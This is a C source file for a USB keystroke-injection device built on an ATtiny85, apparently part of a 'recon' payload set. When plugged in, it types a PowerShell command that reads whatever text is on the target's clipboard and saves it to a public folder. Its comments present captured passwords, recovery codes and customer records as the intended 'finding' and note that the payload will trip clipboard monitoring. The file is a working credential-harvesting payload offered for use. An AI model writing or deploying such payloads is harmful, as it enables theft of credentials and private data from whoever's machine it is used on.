// recon/clipboard - Tier 2
//
// Whatever is currently on the clipboard.
//
// Someone copying a password, a recovery code or a customer record into
// an open chat box has just handed you a credential. That is not a bug in
// your payload, it is the finding.
// Expect this to trip clipboard-access monitoring; it is the only
// collector here that reads data rather than system state.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "Add-Type -AssemblyName System.Windows.Forms"
    "try{[Windows.Forms.Clipboard]::GetText()|Out-String -Width 250}catch{'CLIPBOARD LOCKED BY ANOTHER PROCESS'}"
    R_OUT("clipboard.txt")
    R_SHOW("clipboard.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
